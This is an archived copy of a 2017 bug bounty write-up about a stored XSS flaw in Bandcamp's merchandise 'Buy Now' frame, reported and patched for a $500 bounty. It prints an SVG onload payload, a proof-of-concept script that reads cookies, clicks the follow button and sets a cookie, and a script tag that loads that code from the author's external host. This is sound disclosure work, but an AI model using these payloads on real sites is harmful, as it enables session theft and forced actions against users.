---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-06-30_stored-xss-in-bandcamp.md
original_filename: 2017-06-30_stored-xss-in-bandcamp.md
title: Stored XSS in Bandcamp
category: documents
detected_topics:
- xss
- idor
- command-injection
- automation-abuse
tags:
- imported
- documents
- xss
- idor
- command-injection
- automation-abuse
language: en
raw_sha256: 373f8b8cd9eb4fae91dc454062441ba2f1f22d9466f728bc0f49377bc88799d5
text_sha256: 90fdb0b14b2c85a80ef7ff29c13e4abaebc45c52836abef9aa6e85d3f98ae77a
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Stored XSS in Bandcamp

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-06-30_stored-xss-in-bandcamp.md
- Source Type: markdown
- Detected Topics: xss, idor, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `373f8b8cd9eb4fae91dc454062441ba2f1f22d9466f728bc0f49377bc88799d5`
- Text SHA256: `90fdb0b14b2c85a80ef7ff29c13e4abaebc45c52836abef9aa6e85d3f98ae77a`


## Content

---
title: "Stored XSS in Bandcamp"
url: "https://corben.io/blog/17-06-30-bandcamp-xss"
final_url: "https://corben.io/blog/17-06-30-bandcamp-xss"
authors: ["Corben Leo (@hacker_)"]
programs: ["Bandcamp"]
bugs: ["Stored XSS"]
bounty: "500"
publication_date: "2017-06-30"
added_date: "2023-05-22"
source: "pentester.land/writeups.json"
original_index: 6166
---

[BACK](/)

# Stored XSS in Bandcamp

AuthorCORBEN LEO

Published2017.06.30

Recently, while my friend [Alyssa Herrera](https://twitter.com/Alyssa_Herrera_) and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that **Bandcamp** ran a bug bounty program. If you have never heard of BandCamp, it is essentially a platform that allows artists, fans, and labels to interact, connect, and support each other.

I instantly was curious to see what I could find, so I signed up for an artist account and created a Bandcamp page. The first function I started to test was the **Add Music** function. This part of the site allows artists to add albums and tracks. I tested for IDOR and XSS, but sadly it wasn't vulnerable to either.

The next function I thought I wanted to test was the **Add Merch** function. There were 2 main parameters in this function that I wanted to test for XSS in immediately. I wanted to see if either the _Item Title_ or _Description_ accepted / rendered any HTML. I put in a simple XSS payload for both: `<svg/onload=confirm(0)>`

I saved and published the new "merchandise", and voila: NOTHING happened. It was sanitized and I was bummed that it didn't work. Then I saw the **Buy Now** button, so I clicked it, which opened a new frame and my XSS fired! They were not correctly sanitizing the **Item Title** in this frame, thus allowing an attacker to simply insert any HTML or javascript.

I am always reluctant in submitting an XSS with merely alert() because it just shows I was too lazy to actually come up with a cool proof-of-concept. With that in mind, I came up with this POC:
  
  
  alert("Stored XSS on BandCamp");
  alert("Your cookies: " + document.cookie);
  document.getElementById("follow-unfollow").click();
  alert("Thanks for the follow :^D");
  document.cookie = "hacker=cdl;path=/;domain=.bandcamp.com";

Then changed the **Item Title** to `<script src=//www.corben.io/bandcamp.js></script>` which made the victim follow me and set the cookie "hacker" to "cdl" for bandcamp.com and all subdomains in their browser! Proof of concept video:

## _Timeline_

  * (6/29/2017) Reported XSS to Bandcamp via Email - (6/30/2017) Confirmed, Patched, & Awarded with a $500 bounty!

Thanks for reading,

**Corben Leo**
